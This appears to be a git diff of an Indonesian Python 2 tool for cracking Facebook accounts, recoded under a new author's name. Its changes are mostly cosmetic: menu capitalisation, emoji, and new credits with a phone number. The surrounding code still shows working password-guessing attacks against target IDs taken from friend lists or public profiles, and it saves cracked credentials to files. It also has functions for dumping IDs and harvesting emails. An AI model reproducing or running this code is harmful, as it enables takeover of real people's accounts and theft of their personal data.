@@ -16,7 +16,7 @@ try:
 	import requests
 except ImportError:
 	os.system("pip2 install requests")
-	os.system("python2 vip.py")
+	os.system("python2 XXXXX.py")
 from requests.exceptions import ConnectionError
 from mechanize import Browser 
 
@@ -61,9 +61,11 @@ def jalan(z):
 logo = """\033[1;31;1m████████ 𝙷𝚊𝚟𝚎 𝚊
 \033[37;1m████████ 𝙽𝚒𝚌𝚎 𝙳𝚊𝚢 🙂
 
-\033[37;1mAuthor   : https://github.com/RIZKY4/vip
+\033[37;1mAuthor   : Muhammad Rizky
 \033[37;1mRecode   : Virgiirhsy
-\033[37;1mFacebook : https://www.facebook.com/imhereonlywithyou"""
+\033[37;1mGithub   : https://github.com/vrhasya/vrh45y4
+\033[37;1mFacebook : https://www.facebook.com/imhereonlywithyou
+\033[37;1mWhatsapp : 0895-2627-1491 ( No Call )"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -308,9 +310,9 @@ def indo():
 	os.system('clear')
 	print logo
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-	print "\033[1;97m[\033[1;93m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari daftar teman"
-	print "\033[1;97m[\033[1;93m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik/teman"
-	print "\033[1;97m[\033[1;93m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
+	print "\033[1;97m[\033[1;93m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari Daftar Teman"
+	print "\033[1;97m[\033[1;93m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari ID Publik / Teman"
+	print "\033[1;97m[\033[1;93m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari File"
 	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	pilih_indo()
@@ -333,15 +335,15 @@ def pilih_indo():
 		os.system('clear')
 		print logo
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		print " \033[1;93m         ××× \033[1;97mCRACK INDONESIA \033[1;93m×××"
+		print " \033[1;93m         🤡 \033[1;97mCRACK INDONESIA \033[1;93m🤡"
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		idt = raw_input("\033[1;97m{\033[1;93m+\033[1;97m} ID publik/teman : ")
+		idt = raw_input("\033[1;97m{\033[1;93m+\033[1;97m} ID Publik / Teman : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print"\033[1;97m{\033[1;93m✓\033[1;97m} Nama : "+op["name"]
 		except KeyError:
-			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"
+			print"\033[1;97m[\033[1;93m!\033[1;97m] ID Publik / Teman Tidak Ada !"
 			raw_input("\n[ Kembali ]")
 			indo()
 		except requests.exceptions.ConnectionError:
@@ -468,7 +470,7 @@ def pilih_indo():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in w['error_msg']:
-															print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass6
+															print '\033[1;93m[Cekpoint] ' + user + ' • ' + pass6
 															cek = open("out/ind1.txt", "a")
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
@@ -484,7 +486,7 @@ def pilih_indo():
 	print '\033[1;97m[\033[1;93m!\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
-	os.system("python2 vip.py")
+	os.system("python2 XXXXX.py")
 	
 ########## CRACK BANGLADESH #######
 def bangla():
@@ -734,9 +736,9 @@ def sandi():
 	os.system('clear')
 	print logo
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-	print "\033[1;97m[\033[1;96m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari daftar teman"
-	print "\033[1;97m[\033[1;96m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik/teman"
-	print "\033[1;97m[\033[1;96m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
+	print "\033[1;97m[\033[1;96m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari Daftar Teman"
+	print "\033[1;97m[\033[1;96m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari ID Publik / Teman"
+	print "\033[1;97m[\033[1;96m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari File"
 	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	pilih_sandi()
@@ -750,7 +752,7 @@ def pilih_sandi():
 		os.system('clear')
 		print logo
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
+		print "\033[1;93m       🤡  \033[1;97mBUAT LIST PASSWORD\033[1;93m  🤡"
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
 		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
@@ -766,7 +768,7 @@ def pilih_sandi():
 		os.system('clear')
 		print logo
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
+		print "\033[1;93m       🤡  \033[1;97mBUAT LIST PASSWORD\033[1;93m  🤡"
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
 		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
@@ -774,7 +776,7 @@ def pilih_sandi():
 		sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 4 : ")
 		sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 5 : ")
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		idt = raw_input("\033[1;97m{\033[1;96m+\033[1;97m} ID publik/teman : ")
+		idt = raw_input("\033[1;97m{\033[1;96m+\033[1;97m} ID Publik / Teman : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -792,7 +794,7 @@ def pilih_sandi():
 		print logo
 		try:
 			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-			print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
+			print "\033[1;93m       🤡  \033[1;97mBUAT LIST PASSWORD\033[1;93m  🤡"
 			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
 			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
@@ -913,7 +915,7 @@ def pilih_sandi():
 	print("\033[1;97m[\033[1;96m!\033[1;97m] \033[1;97mCP file tersimpan : out/world.txt")
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
-	os.system("python2 vip.py")
+	os.system("python2 XXXXX.py")
 	
 ######### DUMP ##########
 def dump():
@@ -928,8 +930,8 @@ def dump():
 	os.system('clear')
 	print logo
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-	print "\033[1;97m[\033[1;95m01\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari daftar teman "
-	print "\033[1;97m[\033[1;95m02\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari publik/teman "
+	print "\033[1;97m[\033[1;95m01\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari Daftar Teman "
+	print "\033[1;97m[\033[1;95m02\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari Publik / Teman "
 	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali "
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	dump_pilih()
@@ -1001,7 +1003,7 @@ def id_teman():
 	except OSError:
 		print('\033[1;97m[\033[1;95m!\033[1;97m]\033[1;97m File anda tidak tersimpan !')
 		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
-		os.system("python2 vip.py")
+		os.system("python2 XXXXX.py")
 	except requests.exceptions.ConnectionError:
 		print"\033[1;97m[×] Tidak ada koneksi !"
 		keluar()
@@ -1054,11 +1056,11 @@ def idfrom_teman():
 	except OSError:
 		print"\033[1;97m[!] File Tidak Tersimpan "
 		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
-		os.system("python2 vip.py")
+		os.system("python2 XXXXX.py")
 	except IOError:
 		print"\033[1;97m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		os.system("python2 vip.py")
+		os.system("python2 XXXXX.py")
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;97m[!] Terhenti")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
@@ -1086,8 +1088,8 @@ def guard():
 	os.system('clear')
 	print logo
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-	print "\033[1;97m[\033[1;90m01\033[1;97m]\033[1;96m->\033[1;97m Aktifkan profile guard"
-	print "\033[1;97m[\033[1;90m02\033[1;97m]\033[1;96m->\033[1;97m Nonaktifkan profile guard"
+	print "\033[1;97m[\033[1;90m01\033[1;97m]\033[1;96m->\033[1;97m Aktifkan Profile Guard"
+	print "\033[1;97m[\033[1;90m02\033[1;97m]\033[1;96m->\033[1;97m Nonaktifkan Profile Guard"
 	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
 	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	guard_pilih()
@@ -1302,14 +1304,14 @@ def yahoofromfriends():
 	print"\033[1;97m[\033[1;92m!\033[1;97m] File tersimpan : out/mailteman.txt"
 	save.close()
 	raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
-	os.system("python2 vip.py")
+	os.system("python2 XXXXX.py")
 		
 #######SAYA########
 def saya():
 	os.system ('clear')
 	print logo
 	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
-	os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
+	os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
 	menu()
 	
 			
